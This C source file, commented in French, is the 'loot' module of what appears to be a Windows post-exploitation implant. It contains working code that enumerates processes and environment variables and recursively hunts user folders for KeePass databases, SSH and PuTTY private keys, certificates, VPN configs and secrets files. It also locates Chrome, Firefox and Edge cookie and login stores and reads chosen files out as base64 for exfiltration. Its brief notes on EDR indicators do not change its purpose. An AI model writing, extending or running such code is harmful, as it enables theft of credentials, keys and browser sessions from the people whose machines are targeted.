#include "loot.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <tlhelp32.h>
#include <shlobj.h>

/**
 * Module LOOT - Implémentation
 *
 * NOTES DE SÉCURITÉ:
 * - Lecture de fichiers sensibles = comportement suspect
 * - Énumération de processus = IOC pour EDR
 * - Accès aux DB de navigateurs = TRÈS suspect
 */

// Taille max d'un fichier à exfiltrer (1 MB)
#define MAX_FILE_SIZE (1024 * 1024)

/**
 * Table de conversion base64
 */
static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Encode des données en base64
 */
static int base64_encode(const unsigned char *input, size_t input_len,
                        char *output, size_t output_size) {
    size_t output_len = 0;
    size_t i;

    for (i = 0; i < input_len; i += 3) {
        unsigned char b1 = input[i];
        unsigned char b2 = (i + 1 < input_len) ? input[i + 1] : 0;
        unsigned char b3 = (i + 2 < input_len) ? input[i + 2] : 0;

        unsigned char c1 = b1 >> 2;
        unsigned char c2 = ((b1 & 0x03) << 4) | (b2 >> 4);
        unsigned char c3 = ((b2 & 0x0F) << 2) | (b3 >> 6);
        unsigned char c4 = b3 & 0x3F;

        if (output_len + 4 >= output_size) return -1;

        output[output_len++] = base64_chars[c1];
        output[output_len++] = base64_chars[c2];
        output[output_len++] = (i + 1 < input_len) ? base64_chars[c3] : '=';
        output[output_len++] = (i + 2 < input_len) ? base64_chars[c4] : '=';
    }

    output[output_len] = '\0';
    return (int)output_len;
}

/**
 * Récupère le répertoire utilisateur
 */
static void get_user_directory(char *path, size_t size, int folder_id) {
    char temp[MAX_PATH];
    if (SHGetFolderPathA(NULL, folder_id, NULL, 0, temp) == S_OK) {
        strncpy(path, temp, size - 1);
        path[size - 1] = '\0';
    } else {
        path[0] = '\0';
    }
}

/**
 * Recherche récursive de fichiers
 */
static void find_files_recursive(const char *dir, const char *pattern,
                                 char *output, size_t *pos, size_t max_size,
                                 int *count, int max_count) {
    if (*count >= max_count) return;

    WIN32_FIND_DATAA find_data;
    char search_path[MAX_PATH];
    char full_path[MAX_PATH];

    // Chercher tous les fichiers dans le répertoire
    snprintf(search_path, sizeof(search_path), "%s\\*", dir);
    HANDLE hFind = FindFirstFileA(search_path, &find_data);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        // Ignorer . et ..
        if (strcmp(find_data.cFileName, ".") == 0 ||
            strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }

        snprintf(full_path, sizeof(full_path), "%s\\%s", dir, find_data.cFileName);

        // Si c'est un répertoire, descendre récursivement
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Éviter les répertoires système
            if (strstr(find_data.cFileName, "Windows") == NULL &&
                strstr(find_data.cFileName, "Program Files") == NULL &&
                strstr(find_data.cFileName, "$") == NULL) {
                find_files_recursive(full_path, pattern, output, pos, max_size, count, max_count);
            }
        } else {
            // Vérifier si le fichier correspond au pattern (simple)
            if (strstr(find_data.cFileName, pattern) != NULL || strcmp(pattern, "*") == 0) {
                // Ajouter au résultat
                int len = snprintf(output + *pos, max_size - *pos, "%s\n", full_path);
                if (len > 0 && *pos + len < max_size) {
                    *pos += len;
                    (*count)++;
                }
            }
        }

        if (*count >= max_count) break;

    } while (FindNextFileA(hFind, &find_data));

    FindClose(hFind);
}

/**
 * Collecte des informations système
 */
int loot_sysinfo(char *output, size_t size) {
    output[0] = '\0';
    size_t pos = 0;

    pos += snprintf(output + pos, size - pos, "[System Information]\n");
    pos += snprintf(output + pos, size - pos, "═══════════════════════════════════════════\n\n");

    // 1. Liste des processus
    pos += snprintf(output + pos, size - pos, "[Running Processes]\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            int count = 0;
            do {
                if (count < 20) {  // Limiter à 20 processus pour la lisibilité
                    pos += snprintf(output + pos, size - pos, "  [%lu] %s\n",
                                   pe32.th32ProcessID, pe32.szExeFile);
                }
                count++;
            } while (Process32Next(hSnapshot, &pe32) && pos < size - 1000);
        }
        CloseHandle(hSnapshot);
    }

    // 2. Variables d'environnement intéressantes
    pos += snprintf(output + pos, size - pos, "\n[Environment Variables]\n");

    char *interesting_vars[] = {"USERNAME", "COMPUTERNAME", "USERDOMAIN",
                                "LOGONSERVER", "PATH", NULL};
    for (int i = 0; interesting_vars[i] != NULL && pos < size - 500; i++) {
        char value[512];
        if (GetEnvironmentVariableA(interesting_vars[i], value, sizeof(value)) > 0) {
            pos += snprintf(output + pos, size - pos, "  %s=%s\n",
                           interesting_vars[i], value);
        }
    }

    // 3. Répertoires utilisateur
    pos += snprintf(output + pos, size - pos, "\n[User Directories]\n");
    char path[MAX_PATH];

    get_user_directory(path, sizeof(path), CSIDL_PROFILE);
    if (path[0]) pos += snprintf(output + pos, size - pos, "  Profile: %s\n", path);

    get_user_directory(path, sizeof(path), CSIDL_DESKTOPDIRECTORY);
    if (path[0]) pos += snprintf(output + pos, size - pos, "  Desktop: %s\n", path);

    get_user_directory(path, sizeof(path), CSIDL_MYDOCUMENTS);
    if (path[0]) pos += snprintf(output + pos, size - pos, "  Documents: %s\n", path);

    get_user_directory(path, sizeof(path), CSIDL_APPDATA);
    if (path[0]) pos += snprintf(output + pos, size - pos, "  AppData: %s\n", path);

    pos += snprintf(output + pos, size - pos, "\n═══════════════════════════════════════════\n");

    return LOOT_SUCCESS;
}

/**
 * Recherche de fichiers par pattern
 */
int loot_find(const char *pattern, char *output, size_t size) {
    output[0] = '\0';
    size_t pos = 0;
    int count = 0;
    int max_results = 50;  // Limiter à 50 résultats

    pos += snprintf(output + pos, size - pos, "[File Search: \"%s\"]\n", pattern);
    pos += snprintf(output + pos, size - pos, "═══════════════════════════════════════════\n\n");

    // Chercher dans les répertoires utilisateur
    char search_dirs[5][MAX_PATH];
    int num_dirs = 0;

    get_user_directory(search_dirs[num_dirs++], MAX_PATH, CSIDL_DESKTOPDIRECTORY);
    get_user_directory(search_dirs[num_dirs++], MAX_PATH, CSIDL_MYDOCUMENTS);
    get_user_directory(search_dirs[num_dirs++], MAX_PATH, CSIDL_PERSONAL);

    // Retirer les wildcards pour la recherche simplifiée
    char clean_pattern[256];
    strncpy(clean_pattern, pattern, sizeof(clean_pattern) - 1);

    // Remplacer * par recherche partielle
    char *star = strchr(clean_pattern, '*');
    if (star) *star = '\0';
    char *dot = strchr(clean_pattern, '.');
    if (dot && dot[1] == '\0') *dot = '\0';

    // Chercher dans chaque répertoire
    for (int i = 0; i < num_dirs && count < max_results && pos < size - 1000; i++) {
        if (search_dirs[i][0] != '\0') {
            find_files_recursive(search_dirs[i], clean_pattern, output, &pos, size, &count, max_results);
        }
    }

    if (count == 0) {
        pos += snprintf(output + pos, size - pos, "[*] No files found matching pattern\n");
    } else {
        pos += snprintf(output + pos, size - pos, "\n[*] Found %d file(s)\n", count);
    }

    pos += snprintf(output + pos, size - pos, "═══════════════════════════════════════════\n");

    return LOOT_SUCCESS;
}

/**
 * Exfiltre un fichier (encodé en base64)
 */
int loot_grab(const char *filepath, char *output, size_t size) {
    output[0] = '\0';

    // Ouvrir le fichier
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(output, size, "[-] Cannot open file: %s (Access Denied)\n", filepath);
        return LOOT_ERROR_ACCESS_DENIED;
    }

    // Vérifier la taille
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size > MAX_FILE_SIZE) {
        CloseHandle(hFile);
        snprintf(output, size, "[-] File too large or invalid: %lu bytes (max 1MB)\n", file_size);
        return LOOT_ERROR_TOO_LARGE;
    }

    // Lire le fichier
    unsigned char *file_data = (unsigned char *)malloc(file_size);
    if (!file_data) {
        CloseHandle(hFile);
        snprintf(output, size, "[-] Memory allocation failed\n");
        return LOOT_ERROR_ENCODING;
    }

    DWORD bytes_read;
    if (!ReadFile(hFile, file_data, file_size, &bytes_read, NULL)) {
        free(file_data);
        CloseHandle(hFile);
        snprintf(output, size, "[-] Failed to read file\n");
        return LOOT_ERROR_ACCESS_DENIED;
    }

    CloseHandle(hFile);

    // Encoder en base64
    size_t header_len = snprintf(output, size,
                                 "[File: %s]\n[Size: %lu bytes]\n[Base64]:\n",
                                 filepath, bytes_read);

    int encoded_len = base64_encode(file_data, bytes_read,
                                    output + header_len,
                                    size - header_len - 100);

    free(file_data);

    if (encoded_len < 0) {
        snprintf(output, size, "[-] Base64 encoding failed (output buffer too small)\n");
        return LOOT_ERROR_ENCODING;
    }

    strcat(output, "\n[End of file]\n");

    return LOOT_SUCCESS;
}

/**
 * Vérifie si un nom de fichier correspond à un fichier sensible connu
 */
static int is_sensitive_filename(const char *filename) {
    char lower[256] = {0};
    size_t i;
    for (i = 0; filename[i] && i < sizeof(lower) - 1; i++) {
        lower[i] = (char)tolower((unsigned char)filename[i]);
    }
    lower[i] = '\0';
    size_t flen = i;

    // Extensions sensibles
    const char *exts[] = {
        ".kdbx", ".kdb",         // KeePass
        ".ppk",                  // PuTTY private key
        ".pem", ".pfx", ".p12",  // Certificats / clés TLS
        ".ovpn",                 // OpenVPN
        NULL
    };
    for (int j = 0; exts[j]; j++) {
        size_t elen = strlen(exts[j]);
        if (flen >= elen && strcmp(lower + flen - elen, exts[j]) == 0)
            return 1;
    }

    // Noms contenant ces sous-chaînes (clés SSH)
    const char *substrings[] = {
        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", NULL
    };
    for (int j = 0; substrings[j]; j++) {
        if (strstr(lower, substrings[j]) != NULL)
            return 1;
    }

    // Noms de fichiers exacts (insensible à la casse)
    const char *exact[] = {
        ".env", "web.config", "appsettings.json",
        "credentials.xml", "secrets.json", NULL
    };
    for (int j = 0; exact[j]; j++) {
        if (strcmp(lower, exact[j]) == 0)
            return 1;
    }

    return 0;
}

/**
 * Parcours récursif à la recherche de fichiers sensibles
 */
static void find_sensitive_recursive(const char *dir, char *output,
                                     size_t *pos, size_t max_size,
                                     int *count, int max_count, int depth) {
    if (*count >= max_count || depth > 8) return;

    WIN32_FIND_DATAA fd;
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", dir);

    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char full_path[MAX_PATH];
        snprintf(full_path, sizeof(full_path), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Ignorer les dossiers système / volumineux
            const char *skip[] = {
                "Windows", "Program Files", "node_modules", "$", NULL
            };
            int should_skip = 0;
            for (int i = 0; skip[i]; i++) {
                if (strstr(fd.cFileName, skip[i]) != NULL) {
                    should_skip = 1;
                    break;
                }
            }
            if (!should_skip)
                find_sensitive_recursive(full_path, output, pos, max_size,
                                         count, max_count, depth + 1);
        } else {
            if (is_sensitive_filename(fd.cFileName)) {
                LARGE_INTEGER li;
                li.LowPart = fd.nFileSizeLow;
                li.HighPart = fd.nFileSizeHigh;
                int len = snprintf(output + *pos, max_size - *pos,
                                   "  [%lldB] %s\n", li.QuadPart, full_path);
                if (len > 0) *pos += len;
                (*count)++;
            }
        }
    } while (FindNextFileA(hFind, &fd) && *pos < max_size - 200);

    FindClose(hFind);
}

/**
 * Recherche de fichiers sensibles connus (KeePass, SSH, certs, configs)
 */
int loot_sensitive(char *output, size_t size) {
    output[0] = '\0';
    size_t pos = 0;
    int count = 0;

    pos += snprintf(output + pos, size - pos,
                    "[Sensitive File Hunt]\n"
                    "═══════════════════════════════════════════\n"
                    "Targets: .kdbx .ppk id_rsa .pem .pfx .ovpn .env ...\n\n");

    char profile[MAX_PATH];
    get_user_directory(profile, sizeof(profile), CSIDL_PROFILE);

    if (profile[0]) {
        find_sensitive_recursive(profile, output, &pos, size, &count, 100, 0);
    }

    if (count == 0) {
        pos += snprintf(output + pos, size - pos, "[-] No sensitive files found\n");
    } else {
        pos += snprintf(output + pos, size - pos,
                        "\n[+] Found %d sensitive file(s)\n"
                        "[*] Use 'loot grab <path>' to exfiltrate\n", count);
    }

    pos += snprintf(output + pos, size - pos,
                    "═══════════════════════════════════════════\n");

    return LOOT_SUCCESS;
}

/**
 * Recherche des DB de navigateurs
 */
int loot_browser(char *output, size_t size) {
    output[0] = '\0';
    size_t pos = 0;

    pos += snprintf(output + pos, size - pos, "[Browser Data Locations]\n");
    pos += snprintf(output + pos, size - pos, "═══════════════════════════════════════════\n\n");
    pos += snprintf(output + pos, size - pos, "[!] Note: Databases are encrypted with DPAPI\n\n");

    char appdata[MAX_PATH];
    char localappdata[MAX_PATH];
    get_user_directory(appdata, sizeof(appdata), CSIDL_APPDATA);
    get_user_directory(localappdata, sizeof(localappdata), CSIDL_LOCAL_APPDATA);

    // Chrome
    pos += snprintf(output + pos, size - pos, "[Chrome]\n");
    char chrome_cookies[MAX_PATH];
    char chrome_login[MAX_PATH];
    snprintf(chrome_cookies, sizeof(chrome_cookies), "%s\\Google\\Chrome\\User Data\\Default\\Cookies", localappdata);
    snprintf(chrome_login, sizeof(chrome_login), "%s\\Google\\Chrome\\User Data\\Default\\Login Data", localappdata);

    if (GetFileAttributesA(chrome_cookies) != INVALID_FILE_ATTRIBUTES) {
        pos += snprintf(output + pos, size - pos, "  [✓] Cookies: %s\n", chrome_cookies);
    } else {
        pos += snprintf(output + pos, size - pos, "  [✗] Cookies: Not found\n");
    }

    if (GetFileAttributesA(chrome_login) != INVALID_FILE_ATTRIBUTES) {
        pos += snprintf(output + pos, size - pos, "  [✓] Logins: %s\n", chrome_login);
    } else {
        pos += snprintf(output + pos, size - pos, "  [✗] Logins: Not found\n");
    }

    // Firefox
    pos += snprintf(output + pos, size - pos, "\n[Firefox]\n");
    char firefox_dir[MAX_PATH];
    snprintf(firefox_dir, sizeof(firefox_dir), "%s\\Mozilla\\Firefox\\Profiles", appdata);

    if (GetFileAttributesA(firefox_dir) != INVALID_FILE_ATTRIBUTES) {
        pos += snprintf(output + pos, size - pos, "  [✓] Profile Dir: %s\n", firefox_dir);
        pos += snprintf(output + pos, size - pos, "  [*] Look for: cookies.sqlite, logins.json\n");
    } else {
        pos += snprintf(output + pos, size - pos, "  [✗] Firefox not found\n");
    }

    // Edge
    pos += snprintf(output + pos, size - pos, "\n[Edge]\n");
    char edge_cookies[MAX_PATH];
    snprintf(edge_cookies, sizeof(edge_cookies), "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", localappdata);

    if (GetFileAttributesA(edge_cookies) != INVALID_FILE_ATTRIBUTES) {
        pos += snprintf(output + pos, size - pos, "  [✓] Cookies: %s\n", edge_cookies);
    } else {
        pos += snprintf(output + pos, size - pos, "  [✗] Cookies: Not found\n");
    }

    pos += snprintf(output + pos, size - pos, "\n═══════════════════════════════════════════\n");
    pos += snprintf(output + pos, size - pos, "[*] Use 'loot grab <path>' to exfiltrate a file\n");

    return LOOT_SUCCESS;
}
